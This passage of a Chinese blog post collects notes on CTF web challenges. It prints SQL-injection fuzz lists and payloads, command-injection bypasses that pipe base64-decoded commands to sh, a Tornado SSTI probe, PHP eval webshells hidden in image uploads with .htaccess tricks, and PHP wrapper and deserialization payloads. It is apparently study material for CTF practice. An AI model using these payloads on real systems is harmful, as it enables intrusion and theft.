<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"flag="</span> <span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
</code></pre> 
<ul><li>请看这位师傅的<a href="https://blog.csdn.net/qq_42967398/article/details/103517730?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161715960816780266221075%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161715960816780266221075&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-103517730.pc_search_result_cache&amp;utm_term=BUUCTF++web+HackWorld&amp;spm=1018.2226.3001.4187">题解</a><br> sql字典</li></ul> 
<pre><code class="prism language-java">select
from
ascii
substr
table
column
by
schema
where
extractvalue
exp
<span class="token keyword">if</span>
<span class="token operator">/</span>
<span class="token punctuation">(</span>
<span class="token punctuation">)</span>
<span class="token operator">%</span>
<span class="token operator">!</span>
@
#
$
<span class="token operator">^</span>
<span class="token operator">&amp;</span>
<span class="token operator">*</span>
<span class="token operator">-</span>
_
<span class="token operator">+</span>
<span class="token operator">=</span>
'
"
<span class="token operator">~</span>
`
\
<span class="token operator">|</span>
<span class="token punctuation">,</span>
<span class="token punctuation">.</span>
<span class="token operator">||</span>
<span class="token operator">&amp;&amp;</span>
order
updatexml
limit
And
Or
<span class="token operator">%</span><span class="token number">23</span>
 
<span class="token operator">&lt;</span>
<span class="token operator">&gt;</span>
regex
group_concat
table_name
table_schema
column_name
database
imformation
union select
<span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>flaaag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>s<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">%</span>s<span class="token punctuation">)</span>
<span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre> 
<p>补充：<a href="https://blog.csdn.net/hahazaizheli/article/details/96428290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161717432816780265487351&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-96428290.pc_search_result_cache&amp;utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&amp;spm=1018.2226.3001.4187">使用burp进行Fuzz测试实现SQL注入</a>，<a href="https://blog.csdn.net/qq_35793285/article/details/111818477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161717432816780265487351&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111818477.pc_search_result_cache&amp;utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&amp;spm=1018.2226.3001.4187">burp的Intruder模块</a></p> 
<h5><a id="GYCTF2020Blacklist__356"></a>[GYCTF2020]Blacklist [堆叠注入]</h5> 
<p><img src="https://images2.imgbox.com/71/15/VcBxX0Gh_o.png" alt="在这里插入图片描述"></p> 
<ul><li>尝试堆叠注入<br> <img src="https://images2.imgbox.com/59/00/8hHj1O00_o.png" alt="在这里插入图片描述"></li><li>爆列名<br> <img src="https://images2.imgbox.com/ea/d3/c2yPJFpj_o.png" alt="在这里插入图片描述"></li></ul> 
<p>HANDLER方法<br> 引自大佬：HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭<br> 构造：</p> 
<pre><code class="prism language-javascript"><span class="token number">1</span>'<span class="token punctuation">;</span>handler FlagHere open<span class="token punctuation">;</span>handler FlagHere read first<span class="token punctuation">;</span>handler FlagHere close<span class="token punctuation">;</span>#
</code></pre> 
<p><a href="https://blog.csdn.net/SopRomeo/article/details/105396372?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161762143216780271594201%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161762143216780271594201&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-105396372.pc_search_result_cache&amp;utm_term=%5BGYCTF2020%5DBlacklist&amp;spm=1018.2226.3001.4187">参考文章</a></p> 
<h3><a id="Ping_376"></a>Ping命令</h3> 
<p>常用管道符命令</p> 
<pre><code class="prism language-java"><span class="token operator">&amp;</span> （按位与） 表示任务在后台执行，如要在后台运行redis<span class="token operator">-</span>server<span class="token punctuation">,</span>则有 redis<span class="token operator">-</span>server <span class="token operator">&amp;</span>

<span class="token operator">&amp;&amp;</span> （逻辑与）表示前一条命令执行成功时，才执行后一条命令 ，如果前面为假，后面的命令也不执行   如 echo '<span class="token number">1</span>‘ <span class="token operator">&amp;&amp;</span> echo ‘<span class="token number">2</span>’

<span class="token operator">|</span> （按位或）表示管道，上一条命令的输出，作为下一条命令参数，直接执行<span class="token operator">|</span>后面的语句，如 echo ‘yes’ <span class="token operator">|</span> wc <span class="token operator">-</span>l

<span class="token operator">||</span> （逻辑或）表示上一条命令执行失败后，才执行下一条命令，否则只执行前面的语句，如 cat nofile <span class="token operator">||</span> echo “fail”

<span class="token punctuation">;</span> 分号表示命令依次执行。
</code></pre> 
<p>1.过滤问题：空格</p> 
<pre><code class="prism language-java"><span class="token punctuation">{<!-- --></span>cat<span class="token punctuation">,</span>flag<span class="token punctuation">.</span>txt<span class="token punctuation">}</span> 
cat$<span class="token punctuation">{<!-- --></span>IFS<span class="token punctuation">}</span>flag<span class="token punctuation">.</span>txt
cat$IFS$<span class="token number">9f</span>lag<span class="token punctuation">.</span>txt
cat<span class="token operator">&lt;</span>flag<span class="token punctuation">.</span>txt
cat<span class="token operator">&lt;</span><span class="token operator">&gt;</span>flag<span class="token punctuation">.</span>txt
kg<span class="token operator">=</span>$<span class="token string">'\x20flag.txt'</span><span class="token operator">&amp;&amp;</span>cat$kg
<span class="token punctuation">(</span>\x20转换成字符串就是空格，这里通过变量的方式绕过<span class="token punctuation">)</span>
</code></pre> 
<p>1)变量拼接字符串</p> 
<pre><code class="prism language-JAVA">b=ag.php;a=fl;cat$IFS$9$a$b 
 
//为什么要反过来？flag匹配时中间有内容也会被匹配。
//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配
</code></pre> 
<p>2)base编码绕过<br> base64 编码的方式来绕过 flag 过滤</p> 
<pre><code class="prism language-java">加密命令
echo “cat flag<span class="token punctuation">.</span>php” <span class="token operator">|</span> base64
解密命令并执行
echo Y2F0IGZsYWcucGhwCg<span class="token operator">==</span> <span class="token operator">|</span> base64 <span class="token operator">-</span>d <span class="token operator">|</span> sh
然后用$IFS$<span class="token number">9</span>代替空格。构造payload

  <span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>echo$IFS$<span class="token number">9</span>Y2F0IGZsYWcucGhwCg<span class="token operator">==</span>$IFS$<span class="token number">9</span><span class="token operator">|</span>$IFS$<span class="token number">9</span>base64$IFS$<span class="token number">9</span><span class="token operator">-</span>d$IFS$<span class="token number">9</span><span class="token operator">|</span>$IFS$<span class="token number">9</span>sh  
</code></pre> 
<p>3)内联执行<br> linux中反引号作为内联使用</p> 
<pre><code class="prism language-java"> cat `ls`
</code></pre> 
<h5><a id="nc_428"></a>nc</h5> 
<p>在linux中nc 后返回网页源码html</p> 
<h3><a id="tornado_432"></a>tornado</h3> 
<p><a href="https://blog.csdn.net/weixin_44037296/article/details/105078717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477364616780271567725%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161477364616780271567725&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-105078717.pc_search_result_no_baidu_js&amp;utm_term=buuctf+easy_tornado+1">BUUCTF tornado题解</a><br> tornado存在模版<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI</a>注入漏洞，尝试通过此漏洞获取到所需内容<br> 1.先访问报错网页</p> 
<pre><code class="prism language-java"><span class="token operator">/</span>error<span class="token operator">?</span>msg<span class="token operator">=</span>Error
</code></pre> 
<p>2.通过handler.settings对象获取cookie_secret的值，即：<br> handler指向RequestHandler<br> RequestHandler.settings指向self.application.settings<br> 所以handler.settings最终指向RequestHandler.application.settings<br> 构造如下：</p> 
<pre><code class="prism language-java"><span class="token operator">/</span>error<span class="token operator">?</span>msg<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span>handler<span class="token punctuation">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p>3.md5只加密二进制，所以先encode(‘utf-8’)编码为二进制,对于函数<br> hash.digest()<br> 返回摘要，作为二进制数据字符串值<br> hash.hexdigest()<br> 返回摘要，作为十六进制数据字符串值<br> 进而根据题目已知信息编写脚本，获取payload</p> 
<h3><a id="_455"></a>文件上传</h3> 
<h5><a id="_456"></a>解法</h5> 
<p>(1) 带图片头的php一句话木马</p> 
<pre><code class="prism language-java">GIF89a<span class="token operator">?</span>
<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">'php'</span><span class="token operator">&gt;</span><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'v'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>(2) 可解析的php后缀名：<br> php3，php4，php5，pht，phtml,phps<br> 注：菜刀连接是要用POST<br> 注意MMIE类型为jpeg，因为只允许图片上传<br> Content-Type: image/jpeg<br> 绕过过程：<br> 1.新建txt文件编写一句话木马，后缀为jpg（还有gif png等格式视情况而定）注意MMIE类型为jpeg，因为只允许图片上传<br> Content-Type: image/jpeg<br> 2.Burpsuite抓包改包，修改文件后缀名，直至上传成功，如<a href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DUpload" rel="nofollow">BUUCTF upload</a>中只有php后缀名为phtml才可以<br> <img src="https://images2.imgbox.com/49/04/eJIwYA37_o.png" alt="在这里插入图片描述"><br> 3.上传成功后用蚁剑连接<br> <img src="https://images2.imgbox.com/c4/c8/PFqDA2A5_o.png" alt="在这里插入图片描述"><br> 最终在根目录可找到flag<br> <img src="https://images2.imgbox.com/d5/d9/XRII3PNS_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="MRCTF_477"></a>[MRCTF]你传你🐎呢</h4> 
<p>1.htaccess文件</p> 
<pre><code>.htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。

概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。

笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
</code></pre> 
<p>2.上传.htaccess文件，注意文件名必须相同才能够被上传成功</p> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"webshell.jpg"</span><span class="token operator">&gt;</span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span>
</code></pre> 
<p>3.上传一句话木马webshell.jpg</p> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'v'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>4.用蚁剑连接获得flag<br> <img src="https://images2.imgbox.com/5b/8b/9b3HF0uf_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="HTTP_503"></a>HTTP</h3> 
<p>请求头Referer:http://xxxxx<br> 修改访问浏览器：在User-Agent中修改<br> 在本地访问：X-Forwarded-For:127.0.0.1</p> 
<h3><a id="PHP_508"></a>PHP</h3> 
<h4><a id="_509"></a>序列化和反序列化</h4> 
<pre><code>（2021.3.24）最近做到php序列化的题
看了好多师傅们的博客学到了很多
Y4师傅博客：https://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5502
这里就打算简单总结一下，以备之后复习
</code></pre> 
<ul><li> <p>1.protected ,private,public属性<br> var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。</p> <p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，注意，这里的 \0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 。</p> <p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \0\0 的前缀，这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。在进行长度计算的时候，会把 \0 也计算上<br> <code>绕过方法</code>：<br> 再序列化内容中用大写S表示字符串，此时字符串就支持后面的字符串用16进制表示</p> </li><li></ul> 
<h4><a id="buu_NiZhuanSiWei_528"></a>buu NiZhuanSiWei</h4> 
<p>题目给出源码：</p> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php  
$text <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$file <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$password <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$text<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>$text<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>

<span class="token comment">//file_get_contents()函数的功能是读取文件内容到一个字符串</span>
    echo <span class="token string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>$text<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        echo <span class="token string">"Not now!"</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">include</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>
        $password <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span>$password<span class="token punctuation">)</span><span class="token punctuation">;</span>
        echo $password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>1.使用data伪协议和文件包含：</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>read<span class="token operator">=</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>useless<span class="token punctuation">.</span>php
</code></pre> 
<p>用php://input伪协议在以POST形式传入“ welcome to the zjctf " 也可以用data伪协议传参</p> 
<pre><code class="prism language-javascript"><span class="token operator">/</span><span class="token operator">?</span>text<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>input<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>read<span class="token operator">=</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>useless<span class="token punctuation">.</span>php
</code></pre> 
<p>2.得到base64编码的页面，解密如下：</p> 
<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php  

<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{<!-- --></span>  <span class="token comment">//flag.php （题目源码注释） </span>
    <span class="token keyword">public</span> $file<span class="token punctuation">;</span>    
    <span class="token keyword">public</span> function <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
            echo <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出文件内容,通过这个函数读取flag</span>
            echo <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
<span class="token operator">?</span><span class="token operator">&gt;</span>  
</code></pre> 
<p>3.反序列化：<br> <img src="https://images2.imgbox.com/35/2f/slyQ7Rpm_o.png" alt="在这里插入图片描述"><br> 4.重新构造payload</p> 
<pre><code class="prism language-javascript"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>useless<span class="token punctuation">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>5.最后查看源码得到flag</p> 
<h4><a id="BUUCTF__2020_AreUSerialz_586"></a>BUUCTF [网鼎杯 2020 青龙组]AreUSerialz</h4> 
<ul><li> <p>知识点：php反序列化漏洞，弱类型比较</p> </li><li> <p>打开地址看到</p> </li></ul> 
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php

<span class="token function">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">protected</span> $op<span class="token punctuation">;</span>
    <span class="token keyword">protected</span> $filename<span class="token punctuation">;</span>
    <span class="token keyword">protected</span> $content<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $op <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        $filename <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        $content <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>
        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $res <span class="token operator">=</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            $res <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">,</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>$res<span class="token punctuation">)</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $res <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $res <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> $res<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span>$s<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        echo <span class="token string">"[Result]: &lt;br&gt;"</span><span class="token punctuation">;</span>
        echo $s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
            $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>op <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">&gt;</span>content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
